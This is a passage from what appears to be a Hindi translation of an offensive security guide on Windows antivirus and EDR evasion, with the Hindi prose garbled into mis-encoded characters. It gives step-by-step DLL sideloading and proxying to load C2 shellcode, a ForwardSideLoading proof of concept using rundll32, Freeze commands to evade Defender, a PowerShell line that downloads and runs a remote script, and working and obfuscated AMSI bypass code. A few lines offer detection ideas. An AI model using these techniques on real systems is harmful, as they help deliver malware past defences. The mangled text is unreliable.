Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

рдореИрдВ рдЖрдкрдХреЛ рджреГрдврд╝рддрд╛ рд╕реЗ рд╕рд▓рд╛рд╣ рджреЗрддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк рдЦреБрдж **DLL Hijackable/Sideloadable programs** рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░реЗрдВ; рдпрд╣ рддрдХрдиреАрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд░рдиреЗ рдкрд░ рдХрд╛рдлреА stealthy рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЬрд╛рдиреА-рдорд╛рдиреА DLL Sideloadable programs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдХреЗрд╡рд▓ рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдирд╛рдо рд╡рд╛рд▓реА рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ DLL рд░рдЦ рджреЗрдиреЗ рдорд╛рддреНрд░ рд╕реЗ рдЖрдкрдХрд╛ payload рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрд╕ DLL рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ functions рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ; рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕реЗ **DLL Proxying/Forwarding** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

**DLL Proxying** рдкреНрд░реЙрдХреНрд╕реА (рдФрд░ malicious) DLL рд╕реЗ рдХрд┐рдпреЗ рдЧрдП рдХреЙрд▓реНрд╕ рдХреЛ рдУрд░рд┐рдЬрд┐рдирд▓ DLL рдХреА рдУрд░ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдмрдиреА рд░рд╣рддреА рд╣реИ рдФрд░ рдпрд╣ рдЖрдкрдХреЗ payload рдХреЗ execution рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдпреЛрдЧреНрдп рдмрдирддрд╛ рд╣реИред

рдореИрдВ [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реВрдБрдЧрд╛ рдЬреЛ [@flangvik](https://twitter.com/Flangvik/) рджреНрд╡рд╛рд░рд╛ рд╣реИред

рдпреЗ рд╡реЗ рдХрджрдо рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВрдиреЗ рдЕрдкрдирд╛рдпрд╛:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
рдЖрдЦрд┐рд░реА рдХрдорд╛рдВрдб рд╣рдореЗрдВ 2 рдлрд╛рдЗрд▓реЗрдВ рджреЗрдЧреА: рдПрдХ DLL рд╕реНрд░реЛрдд рдХреЛрдб рдЯреЗрдореНрдкрд▓реЗрдЯ, рдФрд░ рдореВрд▓ рдирд╛рдо рдмрджрд▓рд╛ рд╣реБрдЖ DLLред

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
рдпреЗ рдкрд░рд┐рдгрд╛рдо рд╣реИрдВ:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

рд╣рдорд╛рд░реЗ shellcode (рдЬрд┐рд╕реЗ [SGN](https://github.com/EgeBalci/sgn) рд╕реЗ encode рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рдФрд░ proxy DLL рджреЛрдиреЛрдВ рдХреА [antiscan.me](https://antiscan.me) рдкрд░ 0/26 рдбрд┐рдЯреЗрдХреНрд╢рди рд░реЗрдЯ рд╣реИ! рдореИрдВ рдЗрд╕реЗ рдПрдХ рд╕рдлрд▓рддрд╛ рдХрд╣реВрдБрдЧрд╛ред

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдореИрдВ рджреГрдврд╝рддрд╛ рд╕реЗ рд╕рд▓рд╛рд╣ рджреЗрддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк DLL Sideloading рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) рдФрд░ рд╕рд╛рде рд╣реА [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) рдЬрд╝рд░реВрд░ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рд╣рдордиреЗ рдЬреЛ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИ рдЙрд╕реЗ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕рдордЭ рд╕рдХреЗрдВред

### Forwarded Exports рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ (ForwardSideLoading)

Windows PE modules рдРрд╕реЗ functions export рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ "forwarders" рд╣реЛрддреЗ рд╣реИрдВ: code рдХреА рдмрдЬрд╛рдп, export entry рдореЗрдВ `TargetDll.TargetFunc` рдлреЙрд░реНрдо рдХрд╛ ASCII string рд╣реЛрддрд╛ рд╣реИред рдЬрдм рдХреЛрдИ caller рдЗрд╕ export рдХреЛ resolve рдХрд░рддрд╛ рд╣реИ, рддреЛ Windows loader:

- рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рд▓реЛрдб рдирд╣реАрдВ рд╣реИ рддреЛ `TargetDll` рдХреЛ рд▓реЛрдб рдХрд░реЗрдЧрд╛
- рдЙрд╕рд╕реЗ `TargetFunc` рдХреЛ resolve рдХрд░реЗрдЧрд╛

рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рд╡реНрдпрд╡рд╣рд╛рд░:
- рдпрджрд┐ `TargetDll` рдПрдХ KnownDLL рд╣реИ, рддреЛ рдпрд╣ protected KnownDLLs namespace рд╕реЗ supply рд╣реЛрддрд╛ рд╣реИ (рдЬреИрд╕реЗ ntdll, kernelbase, ole32)ред
- рдпрджрд┐ `TargetDll` KnownDLL рдирд╣реАрдВ рд╣реИ, рддреЛ рд╕рд╛рдорд╛рдиреНрдп DLL search order рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЙрд╕ module рдХреА directory рднреА рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ forward resolution рдХрд░ рд░рд╣рд╛ рд╣реИред

рдпрд╣ рдПрдХ indirect sideloading primitive рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ: рдкрд╣рд▓реЗ рдПрдХ signed DLL рдЦреЛрдЬреЗрдВ рдЬреЛ рдХрд┐рд╕реА non-KnownDLL module рдирд╛рдо рдХреА рдУрд░ forwarded function export рдХрд░рддрд╛ рд╣реЛ, рдлрд┐рд░ рдЙрд╕ signed DLL рдХреЛ рдЙрд╕реА directory рдореЗрдВ рд░рдЦреЗрдВ рдЬрд╣рд╛рдБ рдПрдХ attacker-controlled DLL рд╣реЛ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо forwarded target module рдХреЗ рдмрд┐рд▓реНрдХреБрд▓ рд╕рдорд╛рди рд╣реЛред рдЬрдм forwarded export invoke рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ loader forward рдХреЛ resolve рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реА directory рд╕реЗ рдЖрдкрдХреА DLL рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ рдЖрдкрдХреА DllMain execute рдХрд░ рджреЗрддрд╛ рд╣реИред

Windows 11 рдкрд░ рджреЗрдЦрд╛ рдЧрдпрд╛ рдЙрджрд╛рд╣рд░рдг:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` KnownDLL рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рдЦреЛрдЬ рдХреНрд░рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

PoC (рдХреЙрдкреА-рдкреЗрд╕реНрдЯ):
1) рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╕рд┐рд╕реНрдЯрдо DLL рдХреЛ рдХрд┐рд╕реА рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) рдЙрд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг `NCRYPTPROV.dll` рд░рдЦреЗрдВред рдПрдХ рдиреНрдпреВрдирддрдо `DllMain` рд╣реА рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ; `DllMain` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдлреЙрд░рд╡рд░реНрдб рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) рдПрдХ signed LOLBin рд╕реЗ forward рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
рдкреНрд░реЗрдХреНрд╖рд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░:
- rundll32 (signed) рд╕рд╛рдЗрдб-рдмрд╛рдп-рд╕рд╛рдЗрдб `keyiso.dll` (signed) рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ
- рдЬрдм `KeyIsoSetAuditingInterface` рдХреЛ resolve рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд▓реЛрдбрд░ forward рдХрд╛ рдкрд╛рд▓рди рдХрд░ `NCRYPTPROV.SetAuditingInterface` рдкрд░ рдЬрд╛рддрд╛ рд╣реИ
- рд▓реЛрдбрд░ рдлрд┐рд░ `C:\test` рд╕реЗ `NCRYPTPROV.dll` рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ `DllMain` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ
- рдпрджрд┐ `SetAuditingInterface` рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ "missing API" рддреНрд░реБрдЯрд┐ рдХреЗрд╡рд▓ рддрдм рдорд┐рд▓реЗрдЧреА рдЬрдм `DllMain` рдкрд╣рд▓реЗ рд╣реА рдЪрд▓ рдЪреБрдХрд╛ рд╣реЛрдЧрд╛

рд╣рдВрдЯрд┐рдВрдЧ рдЯрд┐рдкреНрд╕:
- рдЙрди forwarded exports рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ рдЬрд╣рд╛рдБ target module KnownDLL рдирд╣реАрдВ рд╣реИред KnownDLLs рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВ: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- рдЖрдк tooling рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ forwarded exports рдХреЛ enumerate рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- рдЙрдореНрдореАрджрд╡рд╛рд░ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП Windows 11 forwarder inventory рджреЗрдЦреЗрдВ: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- рдЙрди рдШрдЯрдирд╛рдУрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ рдЬрд╣рд╛рдБ LOLBins (e.g., rundll32.exe) non-system paths рд╕реЗ signed DLLs рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ рдЙрд╕реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдЙрд╕реА base name рд╡рд╛рд▓реЗ non-KnownDLLs рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВ
- рдРрд╕реЗ process/module chain рдкрд░ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВ: `rundll32.exe` тЖТ non-system `keyiso.dll` тЖТ `NCRYPTPROV.dll` under user-writable paths
- code integrity policies (WDAC/AppLocker) рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ application directories рдореЗрдВ write+execute рдХреЛ deny рдХрд░реЗрдВ

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

рдЖрдк Freeze рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкрдиреЗ shellcode рдХреЛ рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ рд╕реЗ load рдФрд░ execute рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдПрд╡реЗреЫрди рдмрд╕ рдПрдХ рдмрд┐рд▓реНрд▓реА рдФрд░ рдЪреВрд╣рд╛ рдХрд╛ рдЦреЗрд▓ рд╣реИ тАФ рдЬреЛ рдЖрдЬ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рдХрд▓ рдкрдХрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕рд┐рд░реНрдл рдПрдХ рд╣реА рдЯреВрд▓ рдкрд░ рдирд┐рд░реНрднрд░ рди рд░рд╣реЗрдВ; рдЬрд╣рд╛рдБ рд╕рдВрднрд╡ рд╣реЛ, рдХрдИ evasion рддрдХрдиреАрдХреЛрдВ рдХреЛ рдЪреЗрди рдХрд░рдХреЗ рдкреНрд░рдпреЛрдЧ рдХрд░реЗрдВред

## AMSI (Anti-Malware Scan Interface)

AMSI рдХреЛ "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╢реБрд░реБрдЖрдд рдореЗрдВ, AVs рдХреЗрд╡рд▓ рдбрд┐рд╕реНрдХ рдкрд░ рдореМрдЬреВрдж рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╣реА рд╕реНрдХреИрди рдХрд░ рд╕рдХрддреЗ рдереЗ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рдХрд┐рд╕реА payload рдХреЛ рд╕реАрдзреЗ in-memory execute рдХрд░ рдкрд╛рддреЗ рдереЗ, рддреЛ AV рдХреЗ рдкрд╛рд╕ рдЙрд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рдкрд░реНрдпрд╛рдкреНрдд Visibility рдирд╣реАрдВ рдерд╛ред

AMSI рдлреАрдЪрд░ Windows рдХреЗ рдЗрди components рдореЗрдВ integrated рд╣реИред

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

рдпрд╣ antivirus solutions рдХреЛ script рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдРрд╕реА form рдореЗрдВ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ unencrypted рдФрд░ unobfuscated рд╣реЛрддреА рд╣реИред

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд╕рдВрджреЗрд╢ `amsi:` рдХреЛ prepend рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕ executable рдХрд╛ path рдмрддрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓реА рдереА тАФ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, powershell.exe

рд╣рдордиреЗ рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХ рдкрд░ drop рдирд╣реАрдВ рдХреА, рдлрд┐рд░ рднреА in-memory рдореЗрдВ AMSI рдХреЗ рдХрд╛рд░рдг рдкрдХрдбрд╝реЗ рдЧрдПред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **.NET 4.8** рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░, C# code рднреА AMSI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ `Assembly.Load(byte[])` рдЬреИрд╕реА in-memory execution рдХреЛ рднреА рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк AMSI рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ lower versions of .NET (рдЬреИрд╕реЗ 4.7.2 рдпрд╛ рдиреАрдЪреЗ) рдХрд╛ рдЙрдкрдпреЛрдЧ in-memory execution рдХреЗ рд▓рд┐рдП recommend рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

- **Obfuscation**

рдХреНрдпреЛрдВрдХрд┐ AMSI рдореБрдЦреНрдпрддрдГ static detections рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрд┐рди scripts рдХреЛ рдЖрдк load рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ modify рдХрд░рдирд╛ detection рд╕реЗ рдмрдЪрдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдБрдХрд┐, AMSI рдореЗрдВ scripts рдХреЛ unobfuscate рдХрд░рдиреЗ рдХреА capability рднреА рд╣реИ рднрд▓реЗ рд╣реА рдЙрд╕рдореЗрдВ рдХрдИ layers рд╣реЛрдВ, рдЗрд╕рд▓рд┐рдП obfuscation рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдЧрд▓рдд рд╣реЛрдиреЗ рдкрд░ рдпрд╣ рдмреЗрд╣рддрд░ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ред рдЗрд╕рд╕реЗ рдЗрд╕реЗ evade рдХрд░рдирд╛ рд╕рд░рд▓ рдирд╣реАрдВ рд░рд╣рддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХрднреА-рдХрднреА рдХреЗрд╡рд▓ рдХреБрдЫ variable names рдмрджрд▓рдиреЗ рднрд░ рд╕реЗ рднреА рд╕рдорд╛рдзрд╛рди рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕ рдЪреАрдЬрд╝ рдХреЛ рдХрд┐рддрдирд╛ flag рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

- **AMSI Bypass**

рдЪреВрдВрдХрд┐ AMSI рдХреЛ powershell (рдФрд░ cscript.exe, wscript.exe рдЖрджрд┐) process рдореЗрдВ рдПрдХ DLL load рдХрд░рдХреЗ implement рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ unprivileged user рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЖрд╕рд╛рдиреА рд╕реЗ tamper рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред AMSI рдХреЗ рдЗрд╕ implementation flaw рдХреЗ рдХрд╛рд░рдг рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ AMSI scanning рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рдЦреЛрдЬреЗ рд╣реИрдВред

**Forcing an Error**

AMSI initialization рдХреЛ fail рдХрд░рдиреЗ (amsiInitFailed) рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдирд╛ рдпрд╣ рдкрд░рд┐рдгрд╛рдо рджреЗрдЧрд╛ рдХрд┐ current process рдХреЗ рд▓рд┐рдП рдХреЛрдИ scan initiate рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЗрд╕реЗ рдореВрд▓ рд░реВрдк рд╕реЗ [Matt Graeber](https://twitter.com/mattifestation) рдиреЗ disclose рдХрд┐рдпрд╛ рдерд╛ рдФрд░ Microsoft рдиреЗ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ signature рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рд╣реИред
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
рдПрдХ рд╣реА powershell рдХреЛрдб рдХреА рд▓рд╛рдЗрди рдиреЗ рд╡рд░реНрддрдорд╛рди powershell process рдХреЗ рд▓рд┐рдП AMSI рдХреЛ рдЕрдиреБрдкрдпреЛрдЧреА рдмрдирд╛ рджрд┐рдпрд╛ред рдпрд╣ рд▓рд╛рдЗрди, рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ, AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдпрдВ рдлреНрд▓реИрдЧ рдХреА рдЬрд╛ рдЪреБрдХреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ technique рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдВрд╢реЛрдзрди рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред

рдпрд╣рд╛рдБ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд AMSI bypass рд╣реИ рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ рдЗрд╕ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) рд╕реЗ рд▓рд┐рдпрд╛ред
```bash
Try{#Ams1 bypass technic n┬║ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M├В┬гn├В┬гg' + 'e@+nt.Auto@' + '├В┬гtion.A' -join ''
$fdx = '@ms' + '├В┬гIn├В┬г' + 'tF@├В┬г' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('├В┬г','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('├В┬г','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реЛрддреЗ рд╣реА рд╕рдВрднрд╡рддрдГ рдлрд╝реНрд▓реИрдЧ рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдХрд╛ рд▓рдХреНрд╖реНрдп рдЕрдирджреЗрдЦрд╛ рд░рд╣рдирд╛ рд╣реИ рддреЛ рдХреЛрдИ рднреА рдХреЛрдб рдкреНрд░рдХрд╛рд╢рд┐рдд рди рдХрд░реЗрдВред

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> рдХреГрдкрдпрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рд▓рд┐рдП [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) рдкрдврд╝реЗрдВред

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдирд╛ тАФ amsi.dll рдХреЗ рд▓реЛрдб рдХреЛ рд░реЛрдХрдХрд░ (LdrLoadDll hook)

